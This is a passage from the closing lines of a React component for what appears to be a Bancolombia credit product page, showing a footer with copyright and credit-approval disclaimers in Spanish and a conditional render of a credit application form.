            <p>© 2026 Bancolombia S.A. Todos los derechos reservados. Vigilado por la Superintendencia Financiera de Colombia.</p>
            <p>Sujeto a estudio de crédito. Crédito aprobado según capacidad de pago.</p>
          </div>
        </div>
      </footer>

      {showForm && <CreditForm onClose={() => setShowForm(false)} />}
    </div>
  );
}
